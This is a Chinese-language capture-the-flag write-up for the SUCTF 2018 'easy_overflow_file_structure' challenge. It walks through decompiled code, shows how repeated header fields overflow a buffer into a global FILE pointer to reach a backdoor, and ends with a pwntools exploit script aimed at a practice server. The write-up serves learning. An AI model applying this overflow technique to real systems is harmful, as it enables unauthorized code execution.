# suctf_2018_easy_overflow_file_structure

## 分析

查看保护

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

拿到题目以为是httpd类的pwn题结果是我想多了

```c
// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-1F40h]

  init(*(_QWORD *)&argc, argv, envp);
  fd = fopen("./readme.txt", "r");
  fgets(&s, 0x1F40, stdin);
  su_server(&s);
  fclose(fd);
  return 0;
}
```

让我们输入很多数据然后传到su_server中。

```c
__int64 __fastcall su_server(const char *a1)
{
  unsigned int v1; // eax
  char v3; // [rsp+1Fh] [rbp-1h]

  v1 = time(0);
  srand(v1);
  v3 = rand() % 128;
  memset(&host, 0, 0x7Fu);
  memset(&username, 0, 0x7Fu);
  memset(&researchfield, 0, 0x7Fu);
  byte_60229F = v3;
  byte_60221F = v3;
  byte_60217F = v3;
  if ( strncmp("GET / HTTP/1.1#", a1, 8u) )
    __assert_fail("!strncmp(getMethod,http_header,sizeof(getMethod))", "main.c", 0x59u, "su_server");
  lookForHeader("Host", a1, 8000, &host, 127);
  lookForHeader("Username", a1, 8000, &username, 127);
  lookForHeader("ResearchField", a1, 8000, &researchfield, 127);
  if ( byte_60229F != v3 || byte_60221F != v3 || byte_60217F != v3 )
  {
    if ( fd->_flags == -559038737 )
    {
      puts("66666");
      secret();
    }
    fclose(fd);
    fflush(stderr);
    abort();
  }
  return response(&host, &username, &researchfield);
}
```

fd->_flags = 0xdeadbeef满足这个条件会跳进secret中，而secret是个后门函数

```
.bss:0000000000602178 db ?
.bss:0000000000602179 db ?
.bss:000000000060217A db ?
.bss:000000000060217B db ?
.bss:000000000060217C db ?
.bss:000000000060217D db ?
.bss:000000000060217E db ?
.bss:000000000060217F byte_60217F db ?
.bss:0000000000602180 public fd
.bss:0000000000602180 fd dq ?
.bss:00000000006021A0 public username
.bss:00000000006021A0 username db ?
```

假如researchfield可以进行溢出的话是不是再溢出两个字符就可以控制fd了，那漏洞点在哪里呢，笔者找了一圈没有什么进展，想了一下是和host username researchfield有关而这三个都有个共同的函数lookForHeader，跟进看一下

```c
__int64 __fastcall lookForHeader(const char *a1, __int64 a2, int a3, _BYTE *a4, unsigned int a5)
{
  _BYTE *v5; // rax
  _BYTE *v6; // rdx
  __int64 result; // rax
  unsigned int n; // [rsp+2Ch] [rbp-14h]
  size_t n_4; // [rsp+30h] [rbp-10h]
  unsigned int j; // [rsp+38h] [rbp-8h]
  int i; // [rsp+3Ch] [rbp-4h]

  n = strlen(a1);
  for ( i = 0; ; ++i )
  {
    result = a3 - n;
    if ( (int)result <= i )
      break;
    if ( !strncmp((const char *)(a2 + i), a1, n) && *(_BYTE *)(i + n + a2) == 58 )
    {
      for ( i += n + 1; i < a3 && (*(_BYTE *)(i + a2) == 32 || *(_BYTE *)(i + a2) == 9); ++i )
        ;
      for ( j = i; j < a3; ++j )
      {
        if ( *(_BYTE *)(j + a2) == 35 )
        {
          if ( j - i + 1 <= a5 )
          {
            for ( n_4 = i + a2; n_4 < (unsigned __int64)j + a2; ++n_4 )
            {
              v5 = a4++;
              v6 = (_BYTE *)n_4;
              *v5 = *v6;
            }
            *a4 = 0;
          }
          break;
        }
      }
    }
  }
  return result;
}
```

当这个数据有多个像host这种字段的时候，就会继续执行这个for循环可以继续再次往后填充0x7f个数据，所以我们可以先将0xdeadbeef放入host里，通过researchfield来溢出到fd->_flags，将_flags填成host的0xdeadbeef这里的地址，这样的话fd->_flags->0xdeadbeef就可以getshell了。

## exp
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './z1r0'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

debug = 1
if debug:
    r = remote('node4.buuoj.cn', 29171)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

p1 = b'GET / HTTP/1.1#'
p1 += b'Host:' + p64(0xdeadbeef) + b'#'
p1 += b'Username:z1r0#'
p1 += b'ResearchField:' + b'c' * 0x7e + b'#'
p1 += b'ResearchField:' + b'aa' + p64(0x602220) + b'#'

r.sendline(p1)

r.interactive()
```